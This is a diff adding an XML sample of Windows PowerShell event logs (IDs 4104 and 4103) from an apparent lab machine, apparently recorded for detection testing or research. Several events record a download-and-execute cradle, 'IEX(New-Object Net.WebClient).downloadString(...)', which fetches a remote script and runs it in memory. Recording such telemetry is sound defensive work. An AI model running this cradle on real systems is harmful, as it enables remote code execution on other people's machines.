@@ -1,0 +1,91 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2022-01-24T20:11:11.361955600Z" />
+      <EventRecordID>83421</EventRecordID>
+      <Correlation ActivityID="{3f0c7a49-e4fd-0001-0094-0940fde4d701}" />
+      <Execution ProcessID="5112" ThreadID="4912" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')"</Data>
+      <Data Name="ScriptBlockId">965150b4-b107-4cce-9d30-1d3c55a8a085</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4103</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>106</Task>
+      <Opcode>20</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2022-01-24T20:11:11.361955600Z" />
+      <EventRecordID>83422</EventRecordID>
+      <Correlation ActivityID="{3f0c7a49-e4fd-0000-e3ce-0740fde4d701}" />
+      <Execution ProcessID="5112" ThreadID="4912" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 4.0
+        Host ID = 5a3793a4-31d1-4d3d-a8d1-4cd874d06e70
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 4.0
+        Runspace ID = e9d4be2a-52cd-483a-a7d1-e10f67df6e6c
+        Pipeline ID = 13
+        Command Name = 
+        Command Type = Script
+        Script Name = 
+        Command Path = 
+        Sequence Number = 24
+        User = OFFSEC\admmig
+        Shell ID = Microsoft.PowerShell
+</Data>
+      <Data Name="UserData">
+      </Data>
+      <Data Name="Payload">CommandInvocation(Out-Default): "Out-Default"
+ParameterBinding(Out-Default): name="InputObject"; value="IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')"
+</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2022-01-24T20:11:11.361955600Z" />
+      <EventRecordID>83423</EventRecordID>
+      <Correlation ActivityID="{3f0c7a49-e4fd-0000-e3ce-0740fde4d701}" />
+      <Execution ProcessID="5112" ThreadID="4912" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">prompt</Data>
+      <Data Name="ScriptBlockId">63d67bc9-5a54-4394-8b23-363e369f3c91</Data>
+    </EventData>
+  </Event>
+</root>
